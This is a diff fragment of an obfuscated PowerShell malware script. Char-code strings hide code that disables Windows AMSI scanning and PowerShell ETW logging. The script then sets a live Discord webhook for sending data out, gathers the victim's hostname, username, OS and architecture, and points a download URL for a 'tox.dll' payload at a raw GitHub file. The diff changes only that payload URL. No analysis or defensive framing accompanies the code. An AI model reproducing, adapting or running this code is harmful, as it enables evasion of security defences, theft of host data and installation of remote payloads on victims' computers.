@@ -2,7 +2,7 @@ $ErrorActionPreference = "SilentlyContinue"
 try{$n2=[string]::Join("",@([char]85,[char]116,[char]105,[char]108,[char]115));$n3=[string]::Join("",@([char]97,[char]109,[char]115,[char]105,[char]67,[char]111,[char]110,[char]116,[char]101,[char]120,[char]116));$t=[Ref].Assembly.GetTypes()|Where-Object{$_.Name-like"*$n2*"};$f=$t.GetFields("NonPublic,Static")|Where-Object{$_.Name-like"*$n3*"};[Runtime.InteropServices.Marshal]::WriteInt32($f.GetValue($null),0x41424344)}catch{}
 try{$ep=[string]::Join("",@([char]101,[char]116,[char]119,[char]80,[char]114,[char]111,[char]118,[char]105,[char]100,[char]101,[char]114));$me=[string]::Join("",@([char]109,[char]95,[char]101,[char]110,[char]97,[char]98,[char]108,[char]101,[char]100));$pt=[string]::Join("",@([char]80,[char]83,[char]69,[char]116,[char]119,[char]76,[char]111,[char]103,[char]80,[char]114,[char]111,[char]118,[char]105,[char]100,[char]101,[char]114));$at=[string]::Join("",@([char]84,[char]114,[char]97,[char]99,[char]105,[char]110,[char]103));$ns="System.Management.Automation.$at.$pt";$p2=[System.Reflection.Assembly]::GetAssembly([PSObject]).GetType($ns);$q=$p2.GetField($ep,"NonPublic,Static").GetValue($null);$q.GetType().GetField($me,"NonPublic,Instance").SetValue($q,0)}catch{}
 $wh="https://discord.com/api/webhooks/1558012203834155069/_c1lSxZkFXxLCi7_-D09InyzmdNL5Mdkxk8tPHCD0KemC70Bx5E44JmVjciciV3H94PX"
-$toxUrl="https://cdn.stoplag.org/tox.dll"
+$toxUrl="https://raw.githubusercontent.com/kurzslsklol/shishyboi/main/tox.dll"
 $hostname=$env:COMPUTERNAME;$username=$env:USERNAME
 $os=(Get-CimInstance Win32_OperatingSystem -ErrorAction SilentlyContinue).Caption;if(-not $os){$os=$env:OS}
 $arch=$env:PROCESSOR_ARCHITECTURE
